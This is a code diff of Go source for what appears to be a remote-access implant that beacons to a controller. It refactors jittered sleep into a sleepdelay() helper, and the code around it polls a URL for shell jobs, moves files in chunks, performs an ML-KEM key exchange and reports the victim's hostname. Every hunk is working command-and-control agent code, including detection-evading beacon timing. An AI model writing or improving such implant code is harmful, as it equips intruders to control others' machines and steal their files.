@@ -690,7 +690,7 @@ func send() { //发送头部信息
             if err := get_decry_f(filename, fileData); err != nil {
                 return
             }
-            a_Mutex.RLock();time.Sleep(time.Duration(delay) * time.Second);a_Mutex.RUnlock()
+            sleepdelay()
         }
     }
     func GET_U_FILE(cmd, splitSize string) {
@@ -712,13 +712,7 @@ func send() { //发送头部信息
         }
         defer f.Close()
         var maxRetry int
-        a_Mutex.RLock()
-        if delay < 30 {
-            maxRetry = 30
-        } else {
-            maxRetry = delay
-        }
-        a_Mutex.RUnlock()
+        a_Mutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};a_Mutex.RUnlock()
         start := 0
         buf := make([]byte, intSize)
         for start < fileSize {
@@ -766,9 +760,7 @@ func send() { //发送头部信息
                 return
             }
             start = end
-            a_Mutex.RLock()
-            time.Sleep(time.Duration(delay) * time.Second)
-            a_Mutex.RUnlock()
+            sleepdelay()
         }
     }
     func getCmd() {
@@ -778,17 +770,7 @@ func send() { //发送头部信息
         var job, shell string
         var msg []string
         for {
-            a_Mutex.RLock()
-            wait := delay
-            if delay > 30 {
-                n, err := crand.Int(crand.Reader, big.NewInt(int64(jitter+1)))
-                if err != nil {
-                    return
-                }
-                wait += int(n.Int64())
-            }
-            a_Mutex.RUnlock()
-            time.Sleep(time.Duration(wait) * time.Second)
+            sleepdelay()
             respBody := getUrl(url)
             if respBody == "" {
                 continue
@@ -1140,19 +1122,20 @@ func send() { //发送头部信息
         }
         return string(result)
     }
-	func generateAndUpdateKey(url string){
-		base_respBody := getUrl(url)
-		serverPubKeyBytes := customBase64Decode(base_respBody)
-		a_Mutex.RLock();wait := delay;jitterValue := jitter;a_Mutex.RUnlock()
+    func sleepdelay(){
+        a_Mutex.RLock();wait := delay;jitterValue := jitter;a_Mutex.RUnlock()
         if wait < 0 {wait = 0}
         if wait > 30 && jitterValue > 0 {
             n, err := crand.Int(crand.Reader,big.NewInt(int64(jitterValue)+1),);
-            if err != nil {
-                return
-            }
+            if err != nil {return}
             wait += int(n.Int64())
         }
         time.Sleep(time.Duration(wait) * time.Second)
+    }
+	func generateAndUpdateKey(url string){
+		base_respBody := getUrl(url)
+		serverPubKeyBytes := customBase64Decode(base_respBody)
+		sleepdelay()
 		if len(serverPubKeyBytes) != mlkem.EncapsulationKeySize768 {
             return
         }
@@ -1177,7 +1160,7 @@ func send() { //发送头部信息
             key = nil
             initHttpClient()
             if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
-            clientname = strings.TrimSpace(Command("hostname"))
+            clientname,_ = os.Hostname()
             post_headers["Host"] = master
             get_headers["Host"] = master
             client_b := customBase64Encode([]byte(clientname))
